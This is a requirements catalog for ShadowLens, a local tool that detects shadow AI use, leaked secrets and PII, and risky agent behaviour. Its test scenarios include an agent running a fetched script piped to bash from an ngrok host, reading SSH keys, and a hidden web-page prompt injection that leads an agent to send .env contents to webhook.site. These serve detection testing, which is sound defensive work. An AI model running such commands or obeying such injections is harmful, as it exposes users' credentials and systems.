# ShadowLens Requirements Catalog

**Source of truth:** `ShadowLens_Unified_Master_Specification.md`  
**Specification version:** 1.0 (master implementation baseline)  
**Extraction scope:** Complete document, 1,854 lines  
**Register totals:** 50 unique `REQ-*` IDs · 15 `NOV-*` features · 10 NFRs · 17 REST API method/path rows · 10 simulator scenarios

## 1. Source and interpretation rules

This catalog is extracted from the master specification. The source document controls where a summary here is shorter than the original. No new product behavior is being introduced.

- P0/P1/P2 values below are copied from the functional-requirement labels in section 6.
- Privacy requirements (section 9.1) do not carry P0/P1/P2 labels in the source; they are marked **Mandatory — no P-label specified** rather than assigned an invented priority.
- NFR priorities are not labelled P0/P1/P2 in the source.
- Several section 21 MVP cut-line labels conflict with section 6 functional priorities. These are retained as explicit priority conflicts in section 10.
- Acceptance conditions are expanded in `acceptance_criteria.md`. Where section 6 does not provide a formal Given/When/Then, the acceptance document identifies the operational check as source-derived.

## 2. Functional requirement register

### 2.1 Collection — section 6.1

| Requirement | Priority | Module | Requirement summary |
|---|---:|---|---|
| REQ-COL-001 | P0 | Socket/process collector | Poll `psutil.net_connections(kind="inet")` every 2 seconds (configurable); attribute process metadata; use reverse-DNS and local DNS-observation cache; degrade gracefully when permissions are unavailable. |
| REQ-COL-002 | P0 | PCAP ingestion | Upload PCAP/PCAPNG up to 200 MB; reassemble TCP flows; parse TLS ClientHello SNI/ALPN/JA4-style metadata, plaintext HTTP/1.1, DNS queries/answers. |
| REQ-COL-003 | P0 | HTTP/log ingestion | Accept HAR, mitmproxy JSON flow export, nginx/squid-style JSONL and ShadowLens mock-log format; auto-detect format; route bodies to inspector without persistence. |
| REQ-COL-004 | P0 | Local LLM loopback capture | Detect known local-LLM listeners; optionally capture loopback plaintext through Scapy where permitted; fall back to T1 when privileges are unavailable. |
| REQ-COL-005 | P0 | Lens Gateway | Explicit opt-in local reverse proxy on 127.0.0.1:8787 for OpenAI, Anthropic and Ollama-compatible routes; audit-only forwarding; inspect client plaintext; stream upstream response unchanged; never store bodies. |
| REQ-COL-006 | P1 | Agent adapters | Pluggable LangChain/LangGraph, OpenAI Agents/Anthropic JSONL, AutoGPT, MCP JSON-RPC, Cursor and Claude Code trace adapters. |
| REQ-COL-007 | P0 | Simulator/fixture traffic | `shadowlens simulate` generates mock logs/PCAP and can replay through pipeline; at least 8 scenarios; offline demo populates dashboard in under 20 seconds. |

### 2.2 Shadow AI discovery — section 6.2

| Requirement | Priority | Module | Requirement summary |
|---|---:|---|---|
| REQ-DISC-001 | P0 | Provider registry/classifier | Hot-reloadable provider registry using host, path, port, SNI, header and User-Agent signals; cover named cloud, local and developer AI tools; positive and negative tests for every registry entry; unknown LLM-like APIs remain `unknown_llm_api` at confidence 0.7. |
| REQ-DISC-002 | P0 | Sanctioned/shadow classification | Team policy defines sanctioned providers/tools; all other observed providers are shadow; deduplicate a medium finding by (host, process, provider) over 24 hours. |
| REQ-DISC-003 | P0 | Config-based discovery | Opt-in discovery of known editor/MCP/Ollama/package/process metadata and AI environment-variable names; do not read secret values; identify MCP filesystem root capability and flag root-scoped access. |
| REQ-DISC-004 | P1 | Browser-extension discovery | Read-only inspection of Chrome/Edge/Firefox extension manifests for AI host permissions and broad data-access combinations. |

### 2.3 Payload detection — section 6.3

| Requirement | Priority | Module | Requirement summary |
|---|---:|---|---|
| REQ-DET-001 | P0 | Normalization/detection pipeline | Parse JSON strings, unescape and bounded-decode base64/URL/gzip (depth ≤3, size ≤5 MB); extract candidates; validate; score context; fuse confidence; emit findings. |
| REQ-DET-002 | P0 | Secret rules | Implement the minimum secret rule set: AWS access/secret, GitHub PAT, OpenAI, Anthropic, Hugging Face, Google API, Slack, Stripe, JWT, private key, database URL, Basic-auth URL, Bearer and generic-entropy candidates; each has regex/validator/test vectors/severity. |
| REQ-DET-003 | P0 | Entropy engine | Charset-normalized Shannon entropy for hex/base64/base64url/alphanumeric; thresholds and token-length minima; reject natural language, identifiers, UUIDs, most Git SHAs and lockfile hashes except specified secret-context cases. |
| REQ-DET-004 | P0 | PII rules | Region-aware India/global PII detection: email, phone, card, Aadhaar, PAN, US SSN, IBAN, internal IP/host, context-gated DOB/name and bulk PII; use specified checksum/format validation. |
| REQ-DET-005 | P0 | Proprietary/internal-data heuristics | Detect source-code dumps, organization copyright/license headers, configured internal domains/repository URLs, source-path markers and confidentiality labels; store counts/masked markers, not code. |
| REQ-DET-006 | P0 | Canary detection | Check exact HMAC canary matches first; a match is critical, confidence 1.0, category `canary`. |
| REQ-DET-007 | P0 | Deduplication/suppression | Merge same (HMAC, provider, process) within 1 hour and increment occurrences; allow false-positive suppression by rule plus context fingerprint. |
| REQ-DET-008 | P1 | Streaming/chunk-boundary inspection | Use sliding overlap equal to maximum secret length so values split across stream chunks are detected. |

### 2.4 Agent behavior — section 6.4

| Requirement | Priority | Module | Requirement summary |
|---|---:|---|---|
| REQ-AGT-001 | P0 | Tool-call extraction | Normalize OpenAI, Anthropic, Ollama, MCP and LangChain tool/function calls to tool, arguments, human-approval state and timestamp. |
| REQ-AGT-002 | P0 | Shell-command risk | Tokenize with shell-aware parsing; evaluate chained segments; detect execution, destructive commands, remote execution, privilege escalation, exfiltration, persistence and credential-harvesting patterns with specified severity. |
| REQ-AGT-003 | P0 | Filesystem access risk | Flag unverified reads outside project roots/allow-lists or unapproved sensitive-path reads; canonicalize paths to prevent traversal/symlink/environment-variable evasion. |
| REQ-AGT-004 | P0 | Network-capability risk | Flag first-seen hosts, raw IPs, paste/webhook/tunnel destinations and large POSTs following sensitive reads. |
| REQ-AGT-005 | P0 | Autonomy scoring | Assign per-tool A0–A4 based on chat, file reads, file writes, command execution, network access and observed human approval; feed graph/risk. |
| REQ-AGT-006 | P1 | MCP server risk | Assess capability breadth, root scope, transport, package pinning and publisher trust. |
| REQ-AGT-007 | P0 | Injection-to-exfil correlation | Within 120 seconds correlate instruction-like tool results with a subsequent sensitive read or outbound call to a host first seen less than 10 minutes ago; emit an ordered critical evidence timeline. |

### 2.5 Flow, risk, compliance, triage, policy and UI — sections 6.5–6.8

| Requirement | Priority | Module | Requirement summary |
|---|---:|---|---|
| REQ-SHP-001 | P1 | T2 flow-shape analysis | Per-process/provider baselines; detect bulk upload, chunked repository dump and agent-loop cadence; mark T2 and confidence ≤0.7. |
| REQ-RSK-001 | P0 | Risk engine | Deterministic score for endpoint, tool, provider and organization using section 8.1 algorithm. |
| REQ-RSK-002 | P0 | Risk explanation | `GET /api/risk/{scope}/{id}/explain` returns contribution table, top five drivers and quick wins with projected score deltas. |
| REQ-CMP-001 | P0 | Compliance control mapping | Map rule IDs to framework controls; show posture per framework; export HTML/PDF report. |
| REQ-CMP-002 | P1 | AI-BOM export | Export CycloneDX 1.6 JSON with machine-learning-model, service and application components plus dependencies. |
| REQ-TRI-001 | P0 | Optional LLM triage | Redacted advisory triage through Featherless/Ollama, with deterministic remediation fallback when no key/network is available; async result for medium+ findings. |
| REQ-TRI-002 | P1 | Triage guardrails | Validate LLM output against JSON schema; deterministic verified canary/checksum findings win over LLM disagreement, which is logged. |
| REQ-POL-001 | P0 | Policy loading | Validate section 7.4 YAML policy with Pydantic and support hot reload. |
| REQ-POL-002 | P1 | Policy simulation | Replay stored events/findings under candidate policy and return new/removed violations plus score delta. |
| REQ-UI-001 | P0 | Overview | Display organization risk/trend, tools, critical findings, exfil events, tier mix, providers, processes and live SSE feed. |
| REQ-UI-002 | P0 | Shadow AI inventory | Inventory table with tool/kind/provider/hosts/seen times/sanction/autonomy/risk and a timeline drawer. |
| REQ-UI-003 | P0 | Leak alerts | Filter by severity/category/tier/status; show masked evidence, rule, explanation, confidence, controls, triage and status actions. |
| REQ-UI-004 | P0 | Agent permission graph | React Flow graph of process, agent, MCP server, file scope and network host; risk-coloured edges and evidence details. |
| REQ-UI-005 | P0 | Compliance page | Framework posture, control table and export buttons. |
| REQ-UI-006 | P0 | Ingest page | PCAP/HAR/log drag-drop, live-capture toggle, gateway setup snippets, scenario launcher and canary generator. |
| REQ-UI-007 | P1 | Policy Studio | YAML editor, validation, simulation and diff view. |
| REQ-UI-008 | P0 | Privacy badge | Persistent local-only/raw-payload/LLM-mode status indicator. |
| REQ-UI-009 | P0 | Accessibility and UX | Keyboard navigation, dark/light themes, WCAG AA contrast and useful empty states with Run Demo CTA. |

### 2.6 Privacy — section 9.1

| Requirement | Priority | Module | Requirement summary |
|---|---|---|---|
| REQ-PRIV-001 | Mandatory — no P-label specified | Data lifecycle | Raw payloads exist only in bounded transient inspection memory; never write to disk/logs/traces/database by default; release references; do not claim Python memory zeroization. |
| REQ-PRIV-002 | Mandatory — no P-label specified | Secret vault | Store HMAC-SHA256(install salt, value) and masked preview (first 4, last 2 characters). |
| REQ-PRIV-003 | Mandatory — no P-label specified | Evidence redaction | Redact all sensitive spans in ±40-character context snippets to typed placeholders. |
| REQ-PRIV-004 | Mandatory — no P-label specified | Exports/network privacy | Dashboard/API/exports redacted by default; no telemetry or external requests unless triage explicitly enabled. |
| REQ-PRIV-005 | Mandatory — no P-label specified | Data deletion | `shadowlens forget` irreversibly wipes database, vault and salt. |
| REQ-PRIV-006 | Mandatory — no P-label specified | Identifier minimization | Hash hostnames and usernames in exports unless `--include-identifiers` is specified. |

## 3. Novelty feature register — section 3

The source states these features are in scope unless marked stretch. The associated REQ links below are the source's explicit cross-references or direct functional implementation.

| Novelty | Feature | Main behavior | Functional mapping / source status |
|---|---|---|---|
| NOV-1 | Visibility Tiers & Evidence Chain | Every finding has T1/T2/T3 and linked evidence trail. | Cross-cutting visibility contract; domain model and all collectors/findings. |
| NOV-2 | Config-Based Shadow AI Discovery | Opt-in, read-only inspection of AI/MCP configuration and tool metadata; values minimized/redacted. | REQ-DISC-003; section 21 lists this as P1 while section 6 labels REQ-DISC-003 P0. |
| NOV-3 | Agent Permission Graph | Process → agent → tools/MCP → reachable files/hosts with effective capabilities. | REQ-UI-004; section 21 lists activity/permission graph as P1, while section 6 labels UI P0. |
| NOV-4 | Canary Tokens | User-planted synthetic API key/PII values; outbound match proves a canary exposure. | REQ-DET-006; section 21 P1 list includes canary generator. |
| NOV-5 | Encrypted-Flow Shape Analysis | Detect bulk/chunked uploads and agent cadence when content is not visible. | REQ-SHP-001 (P1). |
| NOV-6 | Injection-to-Exfil Chain Detector | Correlate injection-like tool result with sensitive read/new destination. | REQ-AGT-007 (P0). |
| NOV-7 | AI-BOM | CycloneDX-style AI provider/model/server/agent/MCP inventory. | REQ-CMP-002 (P1); section 21 lists AI-BOM under P2 stretch. |
| NOV-8 | Compliance Control Mapping | Map findings to NIST AI RMF, ISO/IEC 42001, EU AI Act, GDPR Art. 32, DPDP Act and SOC 2. | REQ-CMP-001 (P0). |
| NOV-9 | Explainable Risk Score | Scores decompose into findings, weights and lowering actions. | REQ-RSK-002 (P0). |
| NOV-10 | Policy Simulator | YAML governance policy replay with would-have-violated counts. | REQ-POL-002 (P1). |
| NOV-11 | Privacy-First Vault | HMAC fingerprints, masked previews, forget function, redacted exports. | REQ-PRIV-001–006. |
| NOV-12 | Detection Benchmark Harness | Labelled corpus and per-detector precision/recall/F1. | Section 12; CLI benchmark; target ≥1,000 labelled samples. |
| NOV-13 | Scenario Simulator / Red-Team Traffic Generator | Replayable mock scenarios and mock logs/PCAPs. | REQ-COL-007; 10 scenarios S1–S10 are defined. |
| NOV-14 | LLM Triage with Guardrails | Redacted-only advisory, schema validation, deterministic fallback. | REQ-TRI-001/002. |
| NOV-15 | SIEM/Ticket Export | CEF/syslog, JSONL, SARIF and Slack/Jira webhook. | Marked stretch in section 3; API export format list includes BOM/SARIF/CEF/HTML, not all NOV-15 destinations. |

## 4. Non-functional requirement register — section 10

| NFR ID | Requirement | Target |
|---|---|---|
| NFR-PERF-1 | Sustained ingest throughput | ≥2,000 events/s on a 4-core laptop, excluding LLM triage. |
| NFR-PERF-2 | PCAP ingest | ≥50 MB/s parsing; 200 MB cap. |
| NFR-PERF-3 | Idle footprint with live collectors | <150 MB RAM and <3% CPU. |
| NFR-PERF-4 | Dashboard first paint | <1.5 seconds locally. |
| NFR-REL-1 | Collector failure isolation | One collector failure never stops others; supervisor restart with backoff. |
| NFR-REL-2 | Database | SQLite WAL, batched inserts ≥500 per transaction, automatic retention purge. |
| NFR-SEC-1 | API authentication | No unauthenticated API route except `/api/health`. |
| NFR-PORT-1 | OS support | Linux full; macOS full with psutil limits noted; Windows T1 + log ingestion, loopback sniff requires Npcap. |
| NFR-TEST-1 | Coverage | ≥90% on `core/detect`, ≥80% overall. |
| NFR-DOC-1 | Quick start | README quick-start under 5 commands. |

**Platform caveats required in-app:** psutil may not list other users' sockets without elevation (especially macOS/Windows); loopback sniffing needs privileges; cloud-provider T3 visibility requires user opt-in to gateway, log source or agent hook.

## 5. REST API inventory — section 7.1

All API routes require `Authorization: Bearer <token>` in section 7.1; section 10 NFR-SEC-1 makes `/api/health` the exception.

| Method | Path | Purpose |
|---|---|---|
| GET | `/api/summary` | KPIs and trend. |
| GET | `/api/events?since&provider&tier` | Paged events. |
| GET | `/api/tools` | Tool inventory. |
| PATCH | `/api/tools/{id}` | Sanction toggle/update. |
| GET | `/api/findings?severity&category&status` | Findings/alerts. |
| PATCH | `/api/findings/{id}` | Status change/suppression. |
| POST | `/api/findings/{id}/triage` | Trigger triage. |
| GET | `/api/graph` | Permission graph nodes/edges. |
| GET | `/api/risk/{scope}/{id}/explain` | Risk explanation. |
| GET | `/api/compliance` | Framework posture. |
| POST | `/api/ingest` | Multipart PCAP/HAR/JSONL upload. |
| POST | `/api/simulate/{scenario}` | Run scenario live. |
| POST | `/api/canary` | Create canary. |
| POST | `/api/policy/simulate` | Policy replay diff. |
| GET | `/api/export/{bom|sarif|cef|html}` | Export. |
| GET | `/api/stream` | SSE live events/findings. |
| GET | `/api/health` | Collector status and visibility badge. |

## 6. Detection rule families

### Secrets — REQ-DET-002
- `SEC-AWS-ACCESS-KEY`, `SEC-AWS-SECRET`
- `SEC-GITHUB-PAT`
- `SEC-OPENAI-KEY`, `SEC-ANTHROPIC-KEY`, `SEC-HF-TOKEN`, `SEC-GOOGLE-API`
- `SEC-SLACK-TOKEN`, `SEC-STRIPE-KEY`
- `SEC-JWT`, `SEC-PRIVATE-KEY`, `SEC-DB-URL`, `SEC-BASIC-AUTH-URL`, `SEC-BEARER`, `SEC-GENERIC-ENTROPY`

### PII — REQ-DET-004
- `PII-EMAIL`, `PII-PHONE`, `PII-CC`, `PII-AADHAAR`, `PII-PAN-IN`
- `PII-SSN-US`, `PII-IBAN`, `PII-IP-INTERNAL`, `PII-DOB`, `PII-NAME`, `PII-BULK`

### Agent behavior — REQ-AGT-002/003/004
- Shell: `AGT-SHELL-EXEC`, `AGT-SHELL-DESTRUCT`, `AGT-SHELL-REMOTE-EXEC`, `AGT-SHELL-PRIVESC`, `AGT-SHELL-EXFIL`, `AGT-SHELL-PERSIST`, `AGT-SHELL-CRED-HARVEST`.
- Filesystem: `AGT-FS-SENSITIVE-READ`.
- Network: `AGT-NET-NEW-HOST`; also raw IP, paste/webhook/tunnel destinations and large POST after sensitive read.
- Correlation: `CHAIN-INJECTION-EXFIL`.
- Shape: `SHAPE-BULK-UPLOAD`, `SHAPE-CHUNKED-REPO-DUMP`, `SHAPE-AGENT-LOOP`.
- Proprietary data: `DATA-PROPRIETARY-CODE`.

## 7. Provider registry coverage — REQ-DISC-001

Minimum named coverage: OpenAI, Anthropic, Google Gemini/Vertex, Azure OpenAI, AWS Bedrock, Cohere, Mistral, Perplexity, Groq, Together, Fireworks, Featherless, OpenRouter, Hugging Face Inference/Hub, Replicate, DeepSeek, xAI, Ollama, LM Studio, llama.cpp, vLLM, Cursor, GitHub Copilot, Codeium/Windsurf and Tabnine.

## 8. Scenario library — section 14

| Scenario | Fixture behavior | Expected result |
|---|---|---|
| S1 | Developer pastes .env with AWS + Stripe keys into ChatGPT-like API call. | Two critical secrets, shadow provider, T3. |
| S2 | Support rep sends 40 customer rows with email/phone/Aadhaar. | PII-BULK critical; Verhoeff-validated Aadhaar. |
| S3 | Cursor-like agent reads `~/.ssh/id_rsa` outside project root without approval. | AGT-FS-SENSITIVE-READ critical; A3+. |
| S4 | Agent runs `curl http://x.ngrok.io/s.sh | bash`. | AGT-SHELL-REMOTE-EXEC + NET-NEW-HOST. |
| S5 | Hidden web-page injection → agent reads .env → POST to webhook.site. | CHAIN-INJECTION-EXFIL critical with ordered timeline. |
| S6 | Ollama bound to 0.0.0.0:11434 and used by script. | LAN-exposed local LLM high; T1 + T3. |
| S7 | Encrypted 12 MB upload in 30 chunks to api.openai.com. | SHAPE-CHUNKED-REPO-DUMP, T2, confidence ≤0.7. |
| S8 | Planted canary AWS key appears in prompt. | CANARY critical, confidence 1.0, planted path. |
| S9 | MCP filesystem server has / root and unpinned @latest. | MCP risk high; graph shows broad reach. |
| S10 | Benign sanctioned Azure OpenAI call. | No alert; counted in usage. |

`shadowlens demo` is specified to play S1–S10 in approximately 20 seconds.

## 9. Source-specified traceability excerpt — section 16

| Requirement | Test path | Scenario | Dashboard outcome |
|---|---|---|---|
| REQ-COL-001 | `tests/integration/test_socket.py` | S6 | Inventory/health badge. |
| REQ-COL-002 | `tests/integration/test_pcap.py` | S6, S7 | Ingest page. |
| REQ-COL-005 | `tests/integration/test_gateway.py` | S1, S8 | Gateway setup panel. |
| REQ-DET-002 | `tests/unit/test_rules_secrets.py` + benchmark | S1, S8 | Leak Alerts. |
| REQ-DET-004 | `tests/unit/test_pii_validators.py` + benchmark | S2 | Leak Alerts. |
| REQ-AGT-003 | `tests/unit/test_fs_rules.py` | S3 | Permission Graph. |
| REQ-AGT-007 | `tests/integration/test_chain.py` | S5 | Alert timeline. |
| REQ-SHP-001 | `tests/unit/test_shape.py` | S7 | Alerts (T2 badge). |
| REQ-RSK-001/002 | `tests/unit/test_risk.py` | All | Overview gauge / Why 74? |
| REQ-TRI-001 | `tests/integration/test_triage_fallback.py` | S1 | Triage panel. |
| REQ-PRIV-001 | `tests/security/test_no_raw_persist.py` | All | Privacy badge. |
| REQ-CMP-001/002 | `tests/unit/test_compliance.py` | All | Compliance page. |

The source calls this an **excerpt** and requires extension during implementation; it is not a complete test matrix.

## 10. Priority conflicts and ambiguities to resolve

Do not silently reconcile these source inconsistencies:

1. **Lens Gateway:** REQ-COL-005 is P0 in section 6.1; section 21 lists full optional gateway compatibility as P2; section 17 places gateway in M6 and the time-boxed list calls it stretch.
2. **Live loopback capture:** REQ-COL-004 is P0 in section 6.1; section 21 lists live loopback capture as P2.
3. **Config-based discovery:** REQ-DISC-003 is P0 in section 6.2; section 21 lists config-based discovery as P1.
4. **Agent permission graph:** REQ-UI-004 is P0 in section 6.8; section 21 lists activity/permission graph as P1.
5. **AI-BOM:** REQ-CMP-002 is P1 in section 6.6; section 21 lists AI-BOM among P2 stretch items.
6. **LLM triage:** REQ-TRI-001 is P0 in section 6.6; section 21 lists Featherless advisory triage as P1.
7. **NOV-4 canaries:** REQ-DET-006 is P0 in section 6.3; section 21 lists canary generator as P1.
8. `/api/health` is shown among routes requiring bearer auth in section 7.1, while NFR-SEC-1 explicitly exempts it.
9. `REQ-COL-005` specifies a non-interceptive, explicit opt-in gateway, whereas the project-wide no-MITM/no-TLS-decryption invariant must remain absolute.
10. The source says config discovery reads only AI-relevant allowlisted keys and never secret values; environment variable names may be observed and values hashed. This boundary must remain explicit in implementation.
11. Section 3 says novelty items are in scope unless stretch, but not every NOV item has an independently numbered REQ or a separate Given/When/Then criterion.
12. NFR targets are benchmark goals, not guarantees; section 0 explicitly requires hardware, fixture size and methodology to accompany measured performance.

## 11. Current extraction status

- All 50 functional/privacy requirement IDs are represented in this register.
- All 15 NOV IDs are represented.
- All 9 NFRs, API inventory, source-named detection families, provider coverage list, scenarios and section 16 traceability excerpt are represented.
- This catalog does not assert that any product requirement is implemented. The current repository is still at the bootstrap stage.
